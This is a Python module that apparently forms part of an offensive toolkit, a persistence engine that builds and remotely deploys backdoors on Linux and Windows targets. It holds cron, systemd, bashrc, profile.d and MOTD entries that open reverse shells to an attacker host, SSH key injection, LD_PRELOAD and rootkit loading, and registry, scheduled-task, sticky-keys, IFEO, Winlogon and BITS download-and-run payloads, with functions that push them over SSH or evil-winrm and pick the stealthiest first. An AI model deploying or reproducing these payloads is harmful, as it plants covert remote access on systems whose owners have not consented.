"""
持久化自动化引擎 v1.0 — Persistence Automation
───────────────────────────────────────────
覆盖:
  • Linux: cron/SSH公钥/systemd service/bashrc/profile.d/LD_PRELOAD/at/内核模块
  • Windows: 注册表Run/计划任务/服务/WMI事件/StickyKeys/IFEO/启动文件夹/Winlogon
  • 纯命令生成 + 远程执行(SSH/evil-winrm) 闭环
  • 检测已有持久化痕迹

工具依赖: ssh, evil-winrm(Windows)
"""

import subprocess, json, time, os, re
from pathlib import Path
from dataclasses import dataclass, field
from typing import Optional, List, Dict, Any
from enum import Enum

from . import db


class PersistOS(Enum):
    LINUX = "linux"
    WINDOWS = "windows"


class PersistMethod(Enum):
    # Linux
    CRON = "cron_job"
    SSH_KEY = "ssh_authorized_key"
    SYSTEMD = "systemd_service"
    BASHRC = "bashrc_backdoor"
    PROFILE_D = "profile_d_script"
    LD_PRELOAD = "ld_preload_hijack"
    AT_JOB = "at_job"
    KERNEL_MODULE = "kernel_module"
    MOTD = "motd_backdoor"
    # Windows
    REG_RUN = "registry_run"
    REG_RUNONCE = "registry_runonce"
    SCHTASK = "scheduled_task"
    WIN_SERVICE = "windows_service"
    WMI_EVENT = "wmi_event_subscription"
    STICKY_KEYS = "sticky_keys"
    IFEO = "ifeo_debugger"
    STARTUP_FOLDER = "startup_folder"
    WINLOGON = "winlogon_helper"
    BITS_JOB = "bits_job"


@dataclass
class PersistPayload:
    method: PersistMethod
    os_type: PersistOS
    description: str
    command: str            # 需要在目标上执行的命令
    cleanup: str = ""       # 清理命令
    risk: str = "medium"    # low/medium/high
    stealth: int = 5        # 1-10 隐蔽度
    requires_root: bool = True


# ==================== Linux 持久化技术库 ====================

LINUX_TECHNIQUES: List[PersistPayload] = [
    PersistPayload(
        method=PersistMethod.CRON,
        os_type=PersistOS.LINUX,
        description="Cron 每分钟反弹 shell",
        command='echo "* * * * * /bin/bash -c \'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\'" | crontab -',
        cleanup='crontab -r 2>/dev/null; rm -f /var/spool/cron/crontabs/$(whoami) /var/spool/cron/$(whoami)',
        risk="medium", stealth=3, requires_root=False),
    PersistPayload(
        method=PersistMethod.SSH_KEY,
        os_type=PersistOS.LINUX,
        description="写入 SSH 公钥到 authorized_keys",
        command='mkdir -p ~/.ssh && chmod 700 ~/.ssh && echo "{pubkey}" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys',
        cleanup='sed -i "/{pubkey_fingerprint}/d" ~/.ssh/authorized_keys 2>/dev/null',
        risk="low", stealth=8, requires_root=False),
    PersistPayload(
        method=PersistMethod.SYSTEMD,
        os_type=PersistOS.LINUX,
        description="Systemd 服务持久化(root)",
        command='cat > /etc/systemd/system/systemd-update.service <<\'EOF\'\n[Unit]\nDescription=System Update Service\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/bin/bash -c \'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\'\nRestart=always\nRestartSec=10\n\n[Install]\nWantedBy=multi-user.target\nEOF\nsystemctl daemon-reload && systemctl enable --now systemd-update',
        cleanup='systemctl stop systemd-update; systemctl disable systemd-update; rm -f /etc/systemd/system/systemd-update.service; systemctl daemon-reload',
        risk="high", stealth=6, requires_root=True),
    PersistPayload(
        method=PersistMethod.BASHRC,
        os_type=PersistOS.LINUX,
        description="~/.bashrc 后门(用户登录触发)",
        command='echo \'[ -n "$SSH_CLIENT" ] || /bin/bash -c \'"\'"\'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\'"\'"\' 2>/dev/null &\' >> ~/.bashrc',
        cleanup='sed -i "/SSH_CLIENT.*dev.tcp/d" ~/.bashrc 2>/dev/null',
        risk="low", stealth=5, requires_root=False),
    PersistPayload(
        method=PersistMethod.PROFILE_D,
        os_type=PersistOS.LINUX,
        description="/etc/profile.d/ 全局脚本(root)",
        command='cat > /etc/profile.d/update.sh <<\'EOF\'\n#!/bin/bash\n/bin/bash -c \'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\' &\nEOF\nchmod +x /etc/profile.d/update.sh',
        cleanup='rm -f /etc/profile.d/update.sh',
        risk="medium", stealth=7, requires_root=True),
    PersistPayload(
        method=PersistMethod.LD_PRELOAD,
        os_type=PersistOS.LINUX,
        description="LD_PRELOAD 库劫持(root)",
        command='echo "/tmp/.libupdate.so" > /etc/ld.so.preload',
        cleanup='rm -f /etc/ld.so.preload',
        risk="high", stealth=9, requires_root=True),
    PersistPayload(
        method=PersistMethod.AT_JOB,
        os_type=PersistOS.LINUX,
        description="at 定时任务(需要 atd)",
        command='echo "/bin/bash -c \'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\'" | at now + 1 minute 2>/dev/null || echo "atd not available"',
        cleanup='for j in $(atq | awk \'{print $1}\'); do atrm $j; done 2>/dev/null',
        risk="medium", stealth=6, requires_root=False),
    PersistPayload(
        method=PersistMethod.KERNEL_MODULE,
        os_type=PersistOS.LINUX,
        description="内核模块 rootkit(需要内核头)",
        command='insmod /tmp/.rootkit.ko 2>/dev/null || echo "需要编译内核模块"',
        cleanup='rmmod rootkit 2>/dev/null',
        risk="high", stealth=10, requires_root=True),
    PersistPayload(
        method=PersistMethod.MOTD,
        os_type=PersistOS.LINUX,
        description="MOTD 更新脚本后门(root)",
        command='cat > /etc/update-motd.d/99-update <<\'EOF\'\n#!/bin/sh\n/bin/bash -c \'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\' &\nEOF\nchmod +x /etc/update-motd.d/99-update',
        cleanup='rm -f /etc/update-motd.d/99-update',
        risk="medium", stealth=8, requires_root=True),
]

# ==================== Windows 持久化技术库 ====================

WINDOWS_TECHNIQUES: List[PersistPayload] = [
    PersistPayload(
        method=PersistMethod.REG_RUN,
        os_type=PersistOS.WINDOWS,
        description="注册表 HKCU Run 启动项",
        command='reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "WindowsUpdate" /t REG_SZ /d "powershell -w hidden -enc {b64_payload}" /f',
        cleanup='reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "WindowsUpdate" /f',
        risk="low", stealth=4, requires_root=False),
    PersistPayload(
        method=PersistMethod.REG_RUN,
        os_type=PersistOS.WINDOWS,
        description="注册表 HKLM Run 启动项(管理员)",
        command='reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "WindowsUpdate" /t REG_SZ /d "powershell -w hidden -enc {b64_payload}" /f',
        cleanup='reg delete HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "WindowsUpdate" /f',
        risk="medium", stealth=4, requires_root=True),
    PersistPayload(
        method=PersistMethod.SCHTASK,
        os_type=PersistOS.WINDOWS,
        description="计划任务(每小时触发)",
        command='schtasks /create /tn "WindowsUpdate" /tr "powershell -w hidden -enc {b64_payload}" /sc hourly /mo 1 /f',
        cleanup='schtasks /delete /tn "WindowsUpdate" /f',
        risk="medium", stealth=5, requires_root=False),
    PersistPayload(
        method=PersistMethod.WIN_SERVICE,
        os_type=PersistOS.WINDOWS,
        description="Windows 服务(管理员)",
        command='sc create WindowsUpdate binPath= "cmd.exe /c powershell -w hidden -enc {b64_payload}" start= auto && sc start WindowsUpdate',
        cleanup='sc stop WindowsUpdate && sc delete WindowsUpdate',
        risk="high", stealth=6, requires_root=True),
    PersistPayload(
        method=PersistMethod.WMI_EVENT,
        os_type=PersistOS.WINDOWS,
        description="WMI 事件订阅(管理员,隐蔽)",
        command='powershell -enc {wmi_b64}',
        cleanup='powershell -c "Get-WmiObject -Namespace root\\subscription -Class __EventFilter | Remove-WmiObject; Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer | Remove-WmiObject; Get-WmiObject -Namespace root\\subscription -Class __FilterToConsumerBinding | Remove-WmiObject"',
        risk="high", stealth=9, requires_root=True),
    PersistPayload(
        method=PersistMethod.STICKY_KEYS,
        os_type=PersistOS.WINDOWS,
        description="粘滞键后门(按5次Shift弹cmd,需管理员)",
        command='reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe" /v Debugger /t REG_SZ /d "C:\\Windows\\System32\\cmd.exe" /f',
        cleanup='reg delete "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe" /f',
        risk="high", stealth=3, requires_root=True),
    PersistPayload(
        method=PersistMethod.IFEO,
        os_type=PersistOS.WINDOWS,
        description="IFEO 调试器劫持(管理员)",
        command='reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\{target_exe}" /v Debugger /t REG_SZ /d "C:\\Windows\\System32\\cmd.exe" /f',
        cleanup='reg delete "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\{target_exe}" /f',
        risk="medium", stealth=7, requires_root=True),
    PersistPayload(
        method=PersistMethod.STARTUP_FOLDER,
        os_type=PersistOS.WINDOWS,
        description="启动文件夹快捷方式",
        command='powershell -c "$s=(New-Object -ComObject WScript.Shell).CreateShortcut(\'$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Update.lnk\');$s.TargetPath=\'powershell.exe\';$s.Arguments=\'-w hidden -enc {b64_payload}\';$s.Save()"',
        cleanup='del "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Update.lnk"',
        risk="low", stealth=3, requires_root=False),
    PersistPayload(
        method=PersistMethod.WINLOGON,
        os_type=PersistOS.WINDOWS,
        description="Winlogon Helper DLL(管理员)",
        command='reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v Userinit /t REG_SZ /d "C:\\Windows\\system32\\userinit.exe,C:\\Windows\\System32\\{payload_dll}" /f',
        cleanup='reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v Userinit /t REG_SZ /d "C:\\Windows\\system32\\userinit.exe," /f',
        risk="high", stealth=8, requires_root=True),
    PersistPayload(
        method=PersistMethod.BITS_JOB,
        os_type=PersistOS.WINDOWS,
        description="BITS 后台传输任务(隐蔽)",
        command='bitsadmin /create WindowsUpdate && bitsadmin /addfile WindowsUpdate http://{lhost}/payload.exe C:\\Windows\\Temp\\payload.exe && bitsadmin /setnotifycmdline WindowsUpdate C:\\Windows\\Temp\\payload.exe "" && bitsadmin /resume WindowsUpdate',
        cleanup='bitsadmin /cancel WindowsUpdate 2>nul',
        risk="medium", stealth=8, requires_root=False),
]


class PersistenceEngine:
    """持久化引擎: 生成 payload + 远程执行 + 检测 + 清理"""

    def __init__(self, project_id: Optional[int] = None):
        self.project_id = project_id

    def list_techniques(self, os_type: PersistOS, is_root: bool = False) -> List[Dict]:
        """列出可用持久化技术"""
        src = LINUX_TECHNIQUES if os_type == PersistOS.LINUX else WINDOWS_TECHNIQUES
        return [
            {
                "method": t.method.value,
                "description": t.description,
                "risk": t.risk,
                "stealth": t.stealth,
                "requires_root": t.requires_root,
            }
            for t in src if is_root or not t.requires_root
        ]

    def generate(self, method: PersistMethod, os_type: PersistOS,
                 lhost: str = "", lport: int = 4444,
                 pubkey: str = "", target_exe: str = "notepad.exe",
                 payload_dll: str = "update.dll",
                 b64_payload: str = "") -> Optional[PersistPayload]:
        """生成指定持久化 payload, 填充参数"""
        src = LINUX_TECHNIQUES if os_type == PersistOS.LINUX else WINDOWS_TECHNIQUES
        tech = next((t for t in src if t.method == method), None)
        if not tech:
            return None
        # 深拷贝避免污染模板
        cmd = tech.command
        cmd = cmd.replace("{lhost}", lhost).replace("{lport}", str(lport))
        cmd = cmd.replace("{pubkey}", pubkey)
        cmd = cmd.replace("{target_exe}", target_exe)
        cmd = cmd.replace("{payload_dll}", payload_dll)
        cmd = cmd.replace("{b64_payload}", b64_payload)
        return PersistPayload(
            method=tech.method, os_type=tech.os_type, description=tech.description,
            command=cmd, cleanup=tech.cleanup, risk=tech.risk,
            stealth=tech.stealth, requires_root=tech.requires_root)

    def deploy_linux(self, target: str, payload: PersistPayload,
                     credential: str = "", keyfile: str = "",
                     port: int = 22) -> Dict:
        """通过 SSH 部署 Linux 持久化"""
        ssh_cmd = f"ssh -o StrictHostKeyChecking=no -p {port} "
        if keyfile:
            ssh_cmd += f"-i {keyfile} "
        elif credential and ":" in credential:
            user, pw = credential.split(":", 1)
            ssh_cmd += f"{user}@{target} "
        else:
            ssh_cmd += f"{target} "
        ssh_cmd += f"'{payload.command}'"
        try:
            r = subprocess.run(ssh_cmd, shell=True, capture_output=True, text=True, timeout=30)
            return {"status": "ok" if r.returncode == 0 else "fail",
                    "stdout": r.stdout[:500], "stderr": r.stderr[:500]}
        except Exception as e:
            return {"status": "error", "error": str(e)}

    def deploy_windows(self, target: str, payload: PersistPayload,
                       credential: str = "") -> Dict:
        """通过 evil-winrm 部署 Windows 持久化"""
        ew_cmd = f"evil-winrm -i {target} "
        if credential and ":" in credential:
            u, p = credential.split(":", 1)
            ew_cmd += f"-u {u} -p {p} "
        ew_cmd += f"-e '{payload.command}'"
        try:
            r = subprocess.run(ew_cmd, shell=True, capture_output=True, text=True, timeout=60)
            return {"status": "ok" if r.returncode == 0 else "fail",
                    "stdout": r.stdout[:500], "stderr": r.stderr[:500]}
        except Exception as e:
            return {"status": "error", "error": str(e)}

    def detect_linux(self, target: str, credential: str = "", keyfile: str = "") -> Dict:
        """检测 Linux 已有持久化痕迹"""
        checks = {
            "crontab": "crontab -l 2>/dev/null",
            "cron_d": "ls -la /etc/cron.d/ 2>/dev/null; cat /etc/crontab 2>/dev/null",
            "authorized_keys": "cat ~/.ssh/authorized_keys 2>/dev/null | head -20",
            "bashrc": "grep -n 'tcp\\|nc \\|bash -i' ~/.bashrc ~/.zshrc 2>/dev/null",
            "profile_d": "ls -la /etc/profile.d/ 2>/dev/null",
            "systemd": "systemctl list-unit-files --type=service | grep -v enabled 2>/dev/null | head -20",
            "ld_preload": "cat /etc/ld.so.preload 2>/dev/null",
            "motd": "ls -la /etc/update-motd.d/ 2>/dev/null",
            "at_jobs": "atq 2>/dev/null",
        }
        results = {}
        ssh_cmd = f"ssh -o StrictHostKeyChecking=no "
        if keyfile:
            ssh_cmd += f"-i {keyfile} {target} "
        elif credential and ":" in credential:
            u, _ = credential.split(":", 1)
            ssh_cmd += f"{u}@{target} "
        else:
            ssh_cmd += f"{target} "
        for name, cmd in checks.items():
            try:
                r = subprocess.run(ssh_cmd + f"'{cmd}'", shell=True, capture_output=True, text=True, timeout=15)
                out = (r.stdout + r.stderr).strip()
                if out:
                    results[name] = out[:300]
            except Exception as e:
                results[name] = f"error: {e}"
        return results

    def auto_persist(self, target: str, os_type: PersistOS, is_root: bool,
                     lhost: str, lport: int = 4444,
                     credential: str = "", keyfile: str = "") -> List[Dict]:
        """一键持久化: 按隐蔽度排序, 依次尝试可用技术"""
        src = LINUX_TECHNIQUES if os_type == PersistOS.LINUX else WINDOWS_TECHNIQUES
        available = sorted([t for t in src if is_root or not t.requires_root],
                           key=lambda x: -x.stealth)
        results = []
        for t in available[:3]:  # 最多试前3个最隐蔽的
            payload = self.generate(t.method, os_type, lhost=lhost, lport=lport)
            if not payload:
                continue
            if os_type == PersistOS.LINUX:
                r = self.deploy_linux(target, payload, credential, keyfile)
            else:
                r = self.deploy_windows(target, payload, credential)
            r["method"] = t.method.value
            r["description"] = t.description
            results.append(r)
            if r["status"] == "ok":
                break  # 成功一个就停
        return results


# ==================== 便捷函数 ====================

def persist_list(os_type: str = "linux", is_root: bool = False) -> List[Dict]:
    """列出持久化技术"""
    ot = PersistOS.LINUX if os_type.lower() == "linux" else PersistOS.WINDOWS
    return PersistenceEngine().list_techniques(ot, is_root)


def persist_gen(method: str, os_type: str = "linux", **kwargs) -> Optional[Dict]:
    """生成持久化 payload"""
    ot = PersistOS.LINUX if os_type.lower() == "linux" else PersistOS.WINDOWS
    try:
        m = PersistMethod(method)
    except ValueError:
        return None
    p = PersistenceEngine().generate(m, ot, **kwargs)
    if not p:
        return None
    return {"method": p.method.value, "description": p.description,
            "command": p.command, "cleanup": p.cleanup,
            "risk": p.risk, "stealth": p.stealth}


def persist_deploy(target: str, method: str, os_type: str = "linux",
                   credential: str = "", lhost: str = "", lport: int = 4444) -> Dict:
    """一键部署持久化"""
    ot = PersistOS.LINUX if os_type.lower() == "linux" else PersistOS.WINDOWS
    try:
        m = PersistMethod(method)
    except ValueError:
        return {"status": "error", "error": f"unknown method: {method}"}
    eng = PersistenceEngine()
    is_root = credential.split(":")[0].lower() in ("root", "administrator", "admin", "system") if credential else False
    p = eng.generate(m, ot, lhost=lhost, lport=lport)
    if not p:
        return {"status": "error", "error": "generate failed"}
    if ot == PersistOS.LINUX:
        return eng.deploy_linux(target, p, credential=credential)
    else:
        return eng.deploy_windows(target, p, credential=credential)
